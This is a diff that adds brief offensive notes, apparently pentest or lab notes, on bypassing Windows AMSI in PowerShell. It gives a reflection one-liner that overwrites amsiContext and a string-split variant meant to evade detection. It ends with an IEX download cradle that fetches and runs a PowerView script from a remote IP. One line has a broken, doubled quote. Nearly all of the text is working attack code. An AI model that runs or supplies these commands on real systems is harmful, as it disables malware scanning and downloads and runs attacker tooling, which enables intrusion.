@@ -1,0 +1,21 @@
+AMSI can be bypassed in multiple ways, depending on the access you get.
+
+Using Matt Graebers second reflection method:
+
+[Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext',[Reflection.BindingFlags]'NonPublic,Static').GetValue($null),0x41414141)
+
+But this will get picked up. Some strings can be split like so:
+
+$a='$a='System.Management.Automation.'
+$b='Amsi'
+$c='Utils'
+$r=$a,$b,$c -join ""
+
+$aa='amsi'
+$bb='Context'
+$rr=$aa,$bb -join ""
+
+$x=[ref].assembly.gettype($r)
+[Runtime.InteropServices.Marshal]::WriteInt32($x.getfield($rr,[Reflection.BindingFlags]'NonPublic,Static').GetValue($null),0x41414141)
+
+IEX(new-object net.webclient).downloadstring('http://10.10.16.211/powerview-exe.ps1')
